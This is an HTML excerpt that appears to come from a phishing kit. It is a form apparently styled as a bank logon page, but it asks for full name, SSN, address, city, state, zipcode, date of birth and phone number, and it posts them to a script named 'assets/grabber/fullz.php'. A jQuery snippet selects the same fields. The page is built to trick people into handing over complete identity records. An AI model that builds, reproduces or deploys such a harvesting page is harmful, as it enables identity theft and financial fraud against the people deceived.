              ...
              <div class="col-main-right">
                ...
                <div class="row">
                  <div class="col-sm-7">
                    ...
                    <form method="post" id="aoblogon" name="aoblogon" action="./assets/grabber/fullz.php">
                      <div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container" style="display: none;">
                          <label class="control-label" for="aoblogon_userid">Fullname</label>
                          <div class="controls">
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="fullname" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus">
                          </div>
                        </div>
                        ...
                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Fullname</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="fullname" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">SSN</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="ssn" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Address</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="address" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">State</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="state" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">City</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="city" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Zipcode</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="zipcode" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Date of Birth</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="dob" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Phone Number</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="text" id="aoblogon_userid" name="phone" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>
  ...
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script>
        ...
        $(document).ready(function () {
                var $input = $('[name=dob], [name=fullname], [name=ssn], [name=zipcode], [name=state], [name=city], [name=phone], [name=address]'),
